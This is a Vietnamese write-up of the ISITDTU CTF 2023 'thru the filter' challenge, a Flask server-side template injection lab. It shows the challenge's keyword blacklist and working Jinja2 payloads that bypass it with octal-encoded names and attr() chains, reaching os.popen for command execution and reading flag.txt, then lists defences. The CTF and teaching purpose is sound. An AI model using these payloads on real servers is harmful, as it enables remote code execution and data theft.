# 🚩 Kỹ Thuật Khai Thác SSTI Nâng Cao: ISITDTU CTF 2023 "thru the filter"

## 🔍 Tổng Quan Thử Thách
**Tên thử thách:** thru the filter  
**Loại:** Khai thác Web (SSTI)  
**Độ khó:** Cao  
**Kỹ thuật chính:** 
- Mã hóa octal
- Bypass truy cập thuộc tính
- Khai thác chuỗi đối tượng Python

2.1. Cấu Trúc Ứng Dụng
Ứng dụng sử dụng Flask với một endpoint chính /:

Nhận tham số c từ URL (request.args.get('c')).

Kiểm tra payload với hàm check_payload().

Nếu payload không bị chặn → render_template_string(ssti) → SSTI.

2.2. Hàm check_payload - Blacklist Kiểm Tra Tĩnh
```
blacklist = [
    'import', 'request', 'init', '_', 'b', 'lipsum', 'os', 'globals', 'popen',
    'mro', 'cycler', 'joiner', 'u', 'x', 'g', 'args', 'get_flashed_messages',
    'base', '[', ']', 'builtins', 'namespace', 'self', 'url_for', 'getitem',
    '.', 'eval', 'update', 'config', 'read', 'dict'
]
```
Nhận xét:
- Chặn hầu hết từ khóa quan trọng (os, popen, globals, _, [], ., ...).
- Kiểm tra tĩnh (any(bl in payload for bl in blacklist)), dễ bypass bằng mã hóa hoặc kỹ thuật gián tiếp.
- Không chặn attr() → Có thể thay thế dấu chấm (.).
3. Kỹ Thuật Bypass Blacklist
3.1. Mã Hóa Payload Bằng Octal
Do filter chặn các từ khóa quan trọng, ta chuyển sang mã hóa octal:
```
__class__ → \137\137\143\154\141\163\163\137\137
__base__ → \137\137\142\141\163\145\137\137
os → \157\163
popen → \160\157\160\145\156
```
3.2. Thay Thế Toán Truy Cập Thuộc Tính
Truy cập thông thường	Thay thế bypass
request.args.x	request|attr("args")|attr("x")
x[0]	x|attr("__getitem__")(0)
3.3. Khai Thác Chuỗi Đối Tượng Python
Kỹ thuật leo chuỗi đối tượng để đạt RCE:
```
() → __class__ → __base__ → __subclasses__() → [Popen] → RCE
```
4. Quá Trình Khai Thác Chi Tiết
4.1. Xác Định SSTI
Thử nghiệm với payload cơ bản:
```
/?c={{7*7}} → Kết quả "49" → Xác nhận SSTI.
```
4.2. Bypass Blacklist Để Truy Cập Thuộc Tính
Sử dụng attr() thay cho dấu chấm:
```
{{()|attr("\137\137\143\154\141\163\163\137\137")}}  # __class__
```
4.3. Leo Chuỗi Đối Tượng
```
{{()|attr("\137\137\143\154\141\163\163\137\137")
  |attr("\137\137\142\141\163\145\137\137")
  |attr("\137\137\163\165\142\143\154\141\163\163\145\163\137\137")()}}
```
Kết quả: Liệt kê tất cả các lớp con trong Python.
![image](https://github.com/user-attachments/assets/20790b3d-8122-4e1b-9039-c4688fb94192)
4.4. Tìm Index Của Lớp Popen
Brute-force để tìm index chứa lớp Popen (ở đây là 367):
```
for i in range(500):
    payload = f"{{{{()|attr('\\137\\137class\\137\\137')|attr('\\137\\137base\\137\\137')|attr('\\137\\137subclasses\\137\\137')()|attr('\\137\\137getitem\\137\\137')({i})}}}}"
    if "Popen" in response:
        print(f"Found Popen at index: {i}")
```
![image](https://github.com/user-attachments/assets/6e5af4d1-d60f-4760-a755-6d3797266f0b)
4.5. Truy Cập os Module Và Thực Thi Lệnh
```
{{()|attr("\137\137\143\154\141\163\163\137\137")
  |attr("\137\137\142\141\163\145\137\137")
  |attr("\137\137\163\165\142\143\154\141\163\163\145\163\137\137")()
  |attr("\137\137\147\145\164\151\164\145\155\137\137")(367)  # Popen
  |attr("\137\137\151\156\151\164\137\137")
  |attr("\137\137\147\154\157\142\141\154\163\137\137")
  |attr("\137\137\147\145\164\151\164\145\155\137\137")("\157\163")  # os
  |attr("\160\157\160\145\156")("cat flag.txt")  # popen('cat flag.txt')
  |attr("\162\145\141\144")()}}  # read()
```
Kết quả: Đọc được flag!
![image](https://github.com/user-attachments/assets/89af56e6-37b4-433c-9ef8-866e5e749f9b)
5. Các Kỹ Thuật Nâng Cao Khác
5.1. String Concatenation
```
{% set a = '__cla' %}{% set b = 'ss__' %}{{ ''|attr(a~b) }}
```
5.2. Hex Encoding
```
__class__ → \x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f
```
5.3. Sử Dụng format()
```
{{ ""|attr("__%s__"|format("class")) }}
```
6. Đánh Giá Lỗ Hổng
6.1. Nguyên Nhân
Sử dụng render_template_string() với input người dùng mà không kiểm soát.

Blacklist không hiệu quả → Dễ bypass bằng mã hóa hoặc kỹ thuật gián tiếp.

6.2. Cách Phòng Chống
Không dùng render_template_string với input người dùng.

Sử dụng allowlist thay vì blacklist.

Sandboxing (ví dụ: Jinja2 Sandbox).

7. Kết Luận
Lỗ hổng SSTI trong bài này rất nguy hiểm do cho phép RCE toàn hệ thống.

Blacklist không đủ mạnh → Cần áp dụng allowlist hoặc sandboxing.

Kỹ thuật mã hóa và bypass thuộc tính hiệu quả để vượt qua filter.

✅ Patch thành công sẽ ngăn chặn hoàn toàn khả năng bị khai thác.

